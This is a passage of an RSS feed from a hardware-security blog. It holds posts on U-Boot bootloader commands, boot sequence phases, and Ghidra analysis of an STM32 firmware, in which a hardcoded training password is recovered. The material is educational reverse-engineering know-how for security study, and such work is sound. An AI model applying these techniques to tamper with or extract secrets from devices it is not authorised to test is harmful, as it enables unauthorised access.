https://blog.attify.com/content/images/2021/11/Picture6.png 756w" sizes="(min-width: 720px) 720px"></figure><p>Using the following bare minimum to start the emulation</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture7.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="902" height="24" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture7.png 600w, https://blog.attify.com/content/images/2021/11/Picture7.png 902w" sizes="(min-width: 720px) 720px"></figure><p>At this stage, we are presented with a <strong>QEMU</strong> virtual machine. We can switch between the emulator and the U-Boot console/prompt using a combination of keys</p><p>- <strong>ESC + 1</strong>: Pressing the Escape key and the 1 key takes us to the QEMU emulator</p><p>- <strong>ESC + 2</strong>: Pressing the Escape key and the 2 key takes us to the U-Boot prompt</p><p>- Running QEMU with the <strong>-serial pty</strong> option allows for us to interact with a scrolling buffer through a pty line. </p><p>The <strong>pty line</strong> can be accessed using a <strong>screen</strong> just like the following:</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture8.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="554" height="34"></figure><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture9.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="902" height="584" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture9.png 600w, https://blog.attify.com/content/images/2021/11/Picture9.png 902w" sizes="(min-width: 720px) 720px"></figure><p>Figure 1. Esc + 1 &#x2013; QEMU emulator</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture10.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="902" height="562" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture10.png 600w, https://blog.attify.com/content/images/2021/11/Picture10.png 902w" sizes="(min-width: 720px) 720px"></figure><p>Figure 2. Esc + 2 - U-Boot prompt</p><h2 id="running-das-u-boot-in-an-emulator-qemu"><strong>Running Das-U-Boot in an Emulator (QEMU)</strong></h2><p>Up until this point, we have managed to successfully build a U-Boot image using the utilities found in the U-Boot <strong>.git</strong> repository. &#xA0;We shall now take a look at the U-Boot command prompt, highlighting some of the more useful commands.</p><p>You may recall from the previous blog within this series that U-Boot can be utilized for:</p><p>- The loading of new boot images into flash storage</p><p>AND</p><p>- The execution of memory and storage management tasks</p><p>The functions mentioned above can be used to further an attacker&apos;s foothold on unsuspecting hardware devices. &#xA0;Under the right conditions, an attacker may be able to escape the main bootloader process or alternatively be able to successfully induce a hardware glitch attack. &#xA0;Both of these vectors may allow for further control over the affected hardware device by allowing interaction with U-Boot itself.</p><p>Using our newly created testbed, we will now look at some useful commands, describe their functions, and how they might be leveraged to conduct other nefarious deeds.</p><h1 id="u-boot-command-line">U-Boot command line</h1><p>The U-Boot command prompt is useful to an attacker as it provides a mid-way point between the initialization of a hardware device and the ultimate execution of the Linux kernel. The command prompt itself is not a fully-fledged system, however, it can be powerful in the right hands.</p><p>A good starting point is to work out the lay of the land by gathering details about the specific <strong>version</strong> of U-Boot that is running.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture11.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="902" height="66" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture11.png 600w, https://blog.attify.com/content/images/2021/11/Picture11.png 902w" sizes="(min-width: 720px) 720px"></figure><p>Pressing &apos;<strong>?&apos; </strong>will bring up a scrolling help menu, which details all the available commands U-Boot offers.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture12.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="902" height="650" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture12.png 600w, https://blog.attify.com/content/images/2021/11/Picture12.png 902w" sizes="(min-width: 720px) 720px"></figure><p>Likewise, once you have found a command that you are interested in using but do not necessarily understand its utility, you can couple <code><strong>? + &lt;command&gt;</strong></code><strong> </strong>which will provide a more detailed usage for the chosen command</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture13.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="732" height="148" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture13.png 600w, https://blog.attify.com/content/images/2021/11/Picture13.png 732w" sizes="(min-width: 720px) 720px"></figure><p>A very useful command is the <code><strong>printenv</strong></code> command. &#xA0;This command allows us to print all of the environment variables loaded at U-Boot execution. From the output, we can see many interesting variables, some of which are:</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture14.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="902" height="180" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture14.png 600w, https://blog.attify.com/content/images/2021/11/Picture14.png 902w" sizes="(min-width: 720px) 720px"></figure><p><strong>arch</strong> &#x2013; describing the architecture of the underlying system. Potentially useful to understand the correct binaries and toolchains that can be used to further ongoing attacks</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture15.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="124" height="30"></figure><p><strong>loadaddr </strong>&#x2013;<strong> </strong>describes<strong> </strong>where the kernel image will or could be potentially loaded to and from within DRAM<strong>. </strong>Generally describes the base address and is notated in hex.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture16.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="262" height="36"></figure><p><strong>bootargs</strong> &#x2013; describes the arguments that will be passed to the Linux kernel upon execution</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture17.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="902" height="34" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture17.png 600w, https://blog.attify.com/content/images/2021/11/Picture17.png 902w" sizes="(min-width: 720px) 720px"></figure><p>Figure 3. <strong>console</strong> describes the TTY line and baud rate, whilst <strong>root</strong> and <strong>rootfstype</strong> describes the device where the kernel will be mounted and the file type used for the filesystem, respectively.</p><p>For changes to these variables to be made, it is possible to utilize the <strong>setenv</strong> command for this purpose.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture18.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="716" height="476" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture18.png 600w, https://blog.attify.com/content/images/2021/11/Picture18.png 716w"></figure><p>Once an existing variable or a new one has been configured, we must ensure that this change survives a reboot. &#xA0;For the changes to be written to flash, we employ the use of the <strong>saveenv</strong> command.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/Picture19.png" class="kg-image" alt="To Boot Or Not To Boot &#x2013; Das U-Boot" loading="lazy" width="736" height="138" srcset="https://blog.attify.com/content/images/size/w600/2021/11/Picture19.png 600w, https://blog.attify.com/content/images/2021/11/Picture19.png 736w" sizes="(min-width: 720px) 720px"></figure><p>Generally speaking, an attacker who has managed to take control of a hardware target in this fashion is most likely looking to fully leverage this newfound access by setting up the environment to suit their needs. There are various attack vectors that can be employed to fully control the affected device.</p><p><em><strong>Stay tuned for Part 3 &quot;Practical Attack Vectors&quot;...</strong></em></p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[To Boot Or Not To Boot]]></title>
      <description><![CDATA[A bootloader is simply the part of the system that is used at start-up to assist in the process of successfully starting the system and loading the operating system kernel. Read more.]]></description>
      <link>https://blog.attify.com/bootloaders-part1/</link>
      <guid isPermaLink="false">618098102fe4fa003bbd426c</guid>
      <category><![CDATA[bootloader]]></category>
      <category><![CDATA[embedded hacking]]></category>
      <category><![CDATA[linux]]></category>
      <category><![CDATA[IoT Exploitation]]></category>
      <dc:creator><![CDATA[Victor Hanna]]></dc:creator>
      <pubDate>Sun, 07 Nov 2021 15:19:34 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2021/11/embedded-bootloader-uboot.jpeg" medium="image" />
      <content:encoded><![CDATA[<hr><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2021/11/banner-2.png" class="kg-image" alt="To Boot Or Not To Boot" loading="lazy" width="2000" height="335" srcset="https://blog.attify.com/content/images/size/w600/2021/11/banner-2.png 600w, https://blog.attify.com/content/images/size/w1000/2021/11/banner-2.png 1000w, https://blog.attify.com/content/images/size/w1600/2021/11/banner-2.png 1600w, https://blog.attify.com/content/images/2021/11/banner-2.png 2076w" sizes="(min-width: 720px) 720px"></figure><h2 id="introduction"><a><strong><u>Introduction</u></strong></a></h2><img src="https://blog.attify.com/content/images/2021/11/embedded-bootloader-uboot.jpeg" alt="To Boot Or Not To Boot"><p></p><p>This is <strong>Part 1</strong> of a three-part blog post that will look to describe what a bootloader is and where it fits into the boot process. </p><p><strong>Part 2</strong> will describe the U-Boot bootloader, specifically &quot;Das U-Boot&quot;, where we will be further examining its origins and its usage in the world of embedded Linux systems.</p><p>With a thorough understanding under our belt, we will look to examine the possible attack vectors available using practical examples in <strong>Part 3</strong>.</p><h2 id="what-is-a-bootloader"><a><strong>What is a Bootloader</strong></a></h2><p>In an embedded system context, the bootloader is simply the part of the system that is used at start-up to assist in the process of successfully starting the system and loading the operating system kernel.</p><h2 id="the-bootloaders-role"><a><strong>The Bootloaders Role</strong></a></h2><p>In an embedded system the bootloader has two main functions:</p><p>1. Initialization of the System<br>2. Loading of the Kernel</p><p>An embedded system would be in an absolute minimal functional state, just after power-on or reset. &#xA0;In this state, many controllers and/or supporting chipsets would not yet have come online, and as such, there is a requirement to pre-empt this functionality using available resources.</p><p>Typically this initial functionality is handled by on-chip static memory (ROM). This type of <em>bootstrapping</em> from ROM requires the system to usher in further phases before the final operational state is achieved.</p><p>The final operational state occurs when the kernel has finally been loaded into RAM and is executed. Once this state has been achieved the bootloader is no longer required and the memory that was previously allocated is reclaimed and reused by the system.</p><h2 id="the-3-phases-of-the-boot-sequence"><a><strong><u>The 3 phases of the boot sequence</u></strong></a></h2><h3 id="phase-1-rom-code">Phase 1: <strong>ROM Code</strong></h3><p>As previously mentioned, based on the minimalistic supporting controllers and/or chipsets, the code executed after a power-on or reset is typically stored on-chip on the SoC. This code is known as <strong>ROM Code</strong> and is loaded onto the chip upon manufacturing.</p><p>The <strong>ROM Code</strong> itself is tasked with loading the next instructions or chunk of code into <strong>SRAM</strong> using a choice of peripheral devices. The main reason that SRAM is used is due to this type of memory NOT requiring a memory controller to function and can thus be utilized prior to any sort of controller initialization.</p><p>Some examples of peripheral devices that ROM Code can choose from are:</p><ul><li>NAND memory</li><li>Flash memory connected through SPI</li><li>MMC</li></ul><p>In most cases, the boot sequence, as executed by the ROM Code, will fall back to a number of possible other sources, such as:</p><ul><li>Ethernet</li><li>USB</li><li>UART</li></ul><p>In some cases, the SRAM capacity is not large enough to support a full bootloader and in these cases, an <strong>SPL</strong> (Secondary Program Loader) is used. &#xA0;This SPL itself is loaded into SRAM and at the very end of the ROM Code phase, the SPL is found at the start of SRAM and continues on where the ROM Code left off.</p><h3 id="phase-2-spl-secondary-program-loader">Phase 2: <strong>SPL (Secondary Program Loader)</strong></h3><p>The SPL&#x2019;s main job is the loading of a <strong>TPL</strong> (Tertiary Program Loader) into DRAM. Once loaded into DRAM the TPL then takes on where the SPL left off, however this time from Dynamic memory.</p><p>This process allows for an ever-increasing availability of memory which is used to allocate to the execution of the kernel and file system.</p><h3 id="phase-3-tpl-tertiary-program-loader">Phase 3: <strong>TPL (Tertiary Program Loader)</strong></h3><p>The <strong>TPL</strong> typically takes the form of a fully-fledged bootloader, such as <strong>U-Boot</strong>, which allows for an interactive prompt. &#xA0;This interactive prompt allows for user input in order to run various commands, some of which are:</p><ul><li>The loading of new boot images into flash storage</li><li>Execution of memory and storage management tasks</li></ul><p>Once this phase has been completed the kernel is typically located in memory and execution is then passed to it via the bootloader.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/11/bootloader.png" class="kg-image" alt="To Boot Or Not To Boot" loading="lazy" width="338" height="450"><figcaption>Figure 1. Mastering Embedded Linux Programming &#x2013; Second Edition (Chris Simmons)</figcaption></figure><h2 id="bootloader-to-kernel"><a><strong>Bootloader to Kernel</strong></a></h2><p>Typically before passing full control to the kernel the bootloader needs to offload details by providing plain information to the kernel in order that the kernel can execute cleanly. &#xA0;The following information is typically passed to the kernel by the bootloader:</p><ul><li>The type of <strong>SoC</strong> used</li><li>The size and location of RAM and CPU speed</li><li>The Kernel Command Line</li><li>The location and size of the <strong>DTB</strong> (Device Tree Binary), this is optional and is dependent on whether the device support DTB</li><li>The location and size of the initial RAM disk (<em>initramfs</em>), this is also optional and is dependent on whether the File System itself will be offered up as an initial RAM disk or not</li></ul><p>This information in most modern ARM architectures is typically passed to the kernel using a <strong>Device Tree</strong>.</p><h2 id="device-trees"><a><strong>Device Trees</strong></a></h2><p>A device tree is merely a structured attempt at describing an underlying computer system, such that, a Linux kernel can gain insight into the under-the-hood components of the system that it is running on.</p><p>As its namesake implies the details that are described the system are structured in a tree-like fashion, with the root of the tree (Root Node), denoted as a slash &#x2018;/&#x2019;. All subsequent nodes in the tree are further denoted using a name, value property e.g. <em><strong>name = &#x2018;value&#x2019;</strong></em></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/11/deviceTreeExample.png" class="kg-image" alt="To Boot Or Not To Boot" loading="lazy" width="582" height="224"><figcaption>The above describes a simple node, which details the model of the selected board.</figcaption></figure><p>In order for the device tree to be usable by the bootloader and kernel, it must be presented to both the bootloader and the kernel as a binary file. &#xA0;The <strong>Device-Tree-Compiler </strong>(DTC) is used to compile a <strong>.dts</strong> source into a <strong>.dtb</strong> binary for presentation to both of the interfaces.</p><p><strong><em>Stay tuned for Part 2 &quot;Das U-Boot&quot; ...</em></strong></p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Analyzing bare metal firmware binaries in Ghidra]]></title>
      <description><![CDATA[Analyzing firmware binaries is often different from analyzing a PE or ELF file which have a definite structure. Reverse engineering firmware binaries often entails going through the datasheet, compiler headers to set up the base address and memory map correctly.]]></description>
      <link>https://blog.attify.com/analyzing-bare-metal-firmware-binaries-in-ghidra/</link>
      <guid isPermaLink="false">616138ec3916ac003b443c70</guid>
      <category><![CDATA[ghidra]]></category>
      <category><![CDATA[firmware reverse engineering]]></category>
      <dc:creator><![CDATA[Barun]]></dc:creator>
      <pubDate>Sat, 09 Oct 2021 07:51:51 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2021/10/aQYgUYwnCsM.png" medium="image" />
      <content:encoded><![CDATA[<img src="https://blog.attify.com/content/images/2021/10/aQYgUYwnCsM.png" alt="Analyzing bare metal firmware binaries in Ghidra"><p>In this post we will be looking at analyzing a STM32 firmware binary in Ghidra. In particular the firmware is for the STM32F103C development board from STMicroelectronics.</p><p>The file can be downloaded from <a href="https://drive.google.com/file/d/1ZQeJuKd2b8PgTxCk1VU3k6p0kZQMcMQU/view?usp=sharing">this link</a>.</p><p>Analyzing firmware binaries is often different from analyzing a PE or ELF file. A PE (Portable Executable) is the standard executable file format on Windows. An <em>.exe</em> file is a PE underneath. The PE file format is intended for 32-bit Windows systems. There&#x2019;s the PE64 file format which is similar to PE but intended for 64-bit systems.</p><p>Correspondingly on Linux we have the ELF (Executable and Linkable format) file which serves the same purpose. Both of these file formats have a definite structure. They have a header which describes how the file will be laid in memory when executed. The addresses of the code and data sections are all provided in the file header. Disassemblers such as Ghidra use this information to automatically differentiate between code and data and load the file at the correct address.</p><p>A flat firmware file on the other hand is just a binary blob, a bunch of bytes with no header or metadata describing the layout of the file. When examining such a file the analyst themself have to provide the information to Ghidra.</p><h2 id="preliminary-analysis">Preliminary Analysis</h2><p>Let&#x2019;s go ahead and load the firmware in Ghidra. Since it is a raw binary file Ghidra doesn&#x2019;t know how to process it.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image17.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="502" height="261"><figcaption>Loading the firmware in Ghidra</figcaption></figure><p>STM32F103 are a series of microcontrollers powered by the <a href="https://www.st.com/en/microcontrollers-microprocessors/stm32f103.html">ARM Cortex-M3</a> processor. Cortex-M3 is a 32-bit processor. Let&#x2019;s click on the Language options button and set &quot;ARM-Cortex-32-little&quot; as the language.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image9.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="487" height="345"><figcaption>Specifying language and Compiler Specification</figcaption></figure><p>Leaving the other options as-is we can now continue loading the file and double click to open in the disassembler.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image25.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="998" height="561" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image25.png 600w, https://blog.attify.com/content/images/2021/10/image25.png 998w" sizes="(min-width: 720px) 720px"><figcaption>Ghidra analysis prompt</figcaption></figure><p>Ghidra will prompt to analyze the file and we click yes keeping the default analysis options. Let&#x2019;s have a look at the disassembled code after analysis finishes.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image7.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="843" height="752" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image7.png 600w, https://blog.attify.com/content/images/2021/10/image7.png 843w" sizes="(min-width: 720px) 720px"><figcaption>Unresolved addresses in Ghidra are marked in red</figcaption></figure><p>We can note that several addresses are marked with red colored text. The addresses are of the form <code>08000XXX</code>. Ghidra marks an address in red when the specified address doesn&#x2019;t exist in the file. Double clicking on the address doesn&#x2019;t lead anywhere.</p><p>Similarly let&#x2019;s analyze the disassembly listing of any function (say <code>FUN_000003e4</code>) by clicking it on the symbol tree.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image4.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="287" height="245"><figcaption>The symbol tree</figcaption></figure><p>The disassembly listing has several other addresses marked in red.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image21.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="871" height="658" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image21.png 600w, https://blog.attify.com/content/images/2021/10/image21.png 871w" sizes="(min-width: 720px) 720px"><figcaption>Unresolved addresses in the disassembly listing</figcaption></figure><p>There are references to addresses of the form <code>e000xxxx</code> and <code>20000xxxx</code> which Ghidra wasn&#x2019;t able to resolve. Moreover if we search for strings we can see the strings don&apos;t have any references pointing at them.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image18.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="909" height="466" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image18.png 600w, https://blog.attify.com/content/images/2021/10/image18.png 909w" sizes="(min-width: 720px) 720px"><figcaption>The strings doesn&apos;t have references to them</figcaption></figure><p>All of this indicates that we have not loaded the file at the right address. Had we specified the correct address when loading the file in Ghidra, at least some of the strings would have a reference pointing at them if not all.</p><p>Hence our next step is to find the correct loading address in memory for a STM32 firmware. This information can often be found in the device datasheet and in compiler header files.</p><h2 id="going-through-the-datasheet">Going through the datasheet</h2><p>In the <a href="https://github.com/STMicroelectronics/STM32CubeF1/blob/master/Drivers/CMSIS/Device/ST/STM32F1xx/Include/stm32f103x6.h">stm32f103x6.h header file</a> we can see the base address of flash is <code>0x08000000</code>. This explains the presence of <code>0x08000xxx</code> address in the disassembly listing. Hence the loading address for the firmware is <code>0x08000000</code>.</p><p>SRAM starts at <code>0x20000000</code> which explains the <code>20000xxxx</code> addresses.</p><!--kg-card-begin: markdown--><pre><code>#define FLASH_BASE            0x08000000UL /*!&lt; FLASH base address in the alias region */
#define FLASH_BANK1_END       0x08007FFFUL /*!&lt; FLASH END address of bank1 */
#define SRAM_BASE             0x20000000UL /*!&lt; SRAM base address in the alias region */
#define PERIPH_BASE           0x40000000UL /*!&lt; Peripheral base address in the alias region */
 
#define SRAM_BB_BASE          0x22000000UL /*!&lt; SRAM base address in the bit-band region */
#define PERIPH_BB_BASE        0x42000000UL /*!&lt; Peripheral base address in the bit-band region */
 
 
/*!&lt; Peripheral memory map */
#define APB1PERIPH_BASE       PERIPH_BASE
 
[...]
 
#define FLASH_R_BASE          (AHBPERIPH_BASE + 0x00002000UL) /*!&lt; Flash registers base address */
#define FLASHSIZE_BASE        0x1FFFF7E0UL    /*!&lt; FLASH Size register base address */
#define UID_BASE              0x1FFFF7E8UL    /*!&lt; Unique device ID register base address */
#define OB_BASE               0x1FFFF800UL    /*!&lt; Flash Option Bytes base address */
 
#define DBGMCU_BASE          0xE0042000UL /*!&lt; Debug MCU registers base address */
</code></pre>
<!--kg-card-end: markdown--><p>The same information can also be found in the processor memory map from the <a href=" https://www.st.com/resource/en/datasheet/stm32f103c8.pdf">device datasheet</a>.</p><h2 id="recreating-the-memory-map-in-ghidra">Recreating the memory map in Ghidra</h2><p>Let us re-import the file once again in Ghidra but specifying the correct base address this time. The base address can be specified by clicking the options button in the import dialog.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image16.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="293" height="272"><figcaption>Setting the base address</figcaption></figure><p>Note that the base address has been set to <code>0x08000000</code>. Going ahead with the analysis we can see the <code>0x08000xxx</code> addresses are no longer marked in red. This is because Ghidra is able to locate the address within the file.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image8.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="605" height="696" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image8.png 600w, https://blog.attify.com/content/images/2021/10/image8.png 605w"><figcaption>Addresses are correctly resolved</figcaption></figure><p>In a similar way we can create the SRAM segment at <code>0x20000000</code>. From the datasheet we know, STM32F103C8 devices feature a flash memory size of 64KiB and SRAM of 20 KiB. Our firmware file is already 64KiB in size. 20KiB is <code>0x5000</code> in hexadecimal.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image5.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="919" height="465" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image5.png 600w, https://blog.attify.com/content/images/2021/10/image5.png 919w" sizes="(min-width: 720px) 720px"><figcaption>The device datasheet</figcaption></figure><p>Next go to Window -&gt; Memory Map and click on &quot;+&quot; to add a new memory block. Specify <code>0x20000000</code> as the base address and <code>0x5000</code> as length.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image1.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="415" height="387"><figcaption>Adding the SRAM memory block</figcaption></figure><p>The peripherals are located at address <code>0xE0000000</code> for a length of <code>0x100000</code> bytes.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image22.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="292" height="59"><figcaption>The peripherals memory region</figcaption></figure><p>Correspondingly we can create the memory block in Ghidra.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image14.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="415" height="387"><figcaption>Adding the peripherals memory block</figcaption></figure><p>Going back to <code>FUN_080003e4</code> we can note that the addresses are no longer marked in red.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image24.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="977" height="554" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image24.png 600w, https://blog.attify.com/content/images/2021/10/image24.png 977w" sizes="(min-width: 720px) 720px"><figcaption>Disassembly listing no longer have unresolved addresses</figcaption></figure><p>In the same way, the strings have references showing up next to them.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image3.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="913" height="788" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image3.png 600w, https://blog.attify.com/content/images/2021/10/image3.png 913w" sizes="(min-width: 720px) 720px"><figcaption>Strings have references pointing at them</figcaption></figure><p>This implies we have loaded the file at the correct address with proper memory mapping.</p><h2 id="analyzing-the-firmware-binary">Analyzing the firmware binary</h2><p>Presence of the strings &quot;Enter the password&quot;, &quot;Authentication successful&quot; indicates that the firmware has some sort of password checking logic. The string &quot;Enter the password:&quot; has a reference from the function <code>FUN_080007ee</code>. &#xA0;The decompiled code looks like</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image20.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="742" height="701" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image20.png 600w, https://blog.attify.com/content/images/2021/10/image20.png 742w" sizes="(min-width: 720px) 720px"><figcaption>Decompiled code listing of FUN_080007ee</figcaption></figure><p>Going through the decompiled code we can infer that the firmware reads a string byte by byte till it encounters the <code>\r</code> character. &#xA0;The password is stored in the variable <code>local_20</code>. Then a call is made to the function <code>FUN_080002e0</code> passing in the password buffer as an argument.</p><p>The decompiled code of <code>FUN_080002e0</code> is simple.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image19.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="490" height="261"><figcaption>Decompiled code listing of FUN_080002e0</figcaption></figure><p>The password buffer along with a pointer to the string &quot;attify&quot; is passed on the function <code>FUN_08003910</code>. If the function returns zero, <code>FUN_08000290</code> is called. Else it calls <code>FUN_0800024c</code> for a non-zero return value.</p><p><code>FUN_08000290</code> &#xA0;looks like</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image15.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="650" height="581" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image15.png 600w, https://blog.attify.com/content/images/2021/10/image15.png 650w"><figcaption>Decompiled code listing of FUN_08000290</figcaption></figure><p>Presence of the string &quot;Authentication successful&quot; indicates that this function will be called if the password was correct.</p><p>In the other function, <code>FUN_0800024c</code> we can see the &quot;Authentication Failed&quot; string which implies this will be called if the password is incorrect.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image2.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="644" height="561" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image2.png 600w, https://blog.attify.com/content/images/2021/10/image2.png 644w"><figcaption>Decompiled code listing of FUN_0800024c</figcaption></figure><p>We can deduce that the function <code>FUN_08003910</code> is <code>strcmp</code>, doing a string comparison of the two strings passed in. <code>strcmp</code> returns 0 when the two strings match (equal). The correct password is thus the string &quot;attify&quot;, passed as the second parameter to <code>strcmp</code>.</p><h2 id="using-svd-loader">Using SVD-Loader</h2><p><a href=" https://github.com/leveldown-security/SVD-Loader-Ghidra">SVD-Loader</a> from Leveldown Security is a Ghidra plugin to automate the creation of memory segments and peripherals for bare metal ARM firmware. The plugin parses SVD files and automatically creates the memory segments. SVD field for various ARM platforms can be obtained from the <a href="https://github.com/posborne/cmsis-svd/">cmsis-svd GitHub repository</a>.</p><p>Installing SVD-Loader in Ghidra is simple. After cloning the repo, the path to the directory can be added to the list of Script directories in Script Manager. Script Manager can be accessed from Window -&gt; Script Manager.</p><p>Before running SVD-Loader we need to ensure that the file is loaded at the correct base address <code>0x08000000</code> in the same way as we did before. Once the firmware has been loaded in Ghidra, we can run <em>SVD-Loader.py</em> script from script manager.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image10.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="1083" height="714" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image10.png 600w, https://blog.attify.com/content/images/size/w1000/2021/10/image10.png 1000w, https://blog.attify.com/content/images/2021/10/image10.png 1083w" sizes="(min-width: 720px) 720px"><figcaption>SVD-Loader in Ghidra script manager</figcaption></figure><p>The plugin would prompt to specify the path to a SVD file to parse. We can select the STM32F103xx.svd file downloaded from the cmsis-svd repository and click on &quot;Load SVD File&quot;.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image13.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="786" height="593" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image13.png 600w, https://blog.attify.com/content/images/2021/10/image13.png 786w" sizes="(min-width: 720px) 720px"><figcaption>Choosing a SVD file to 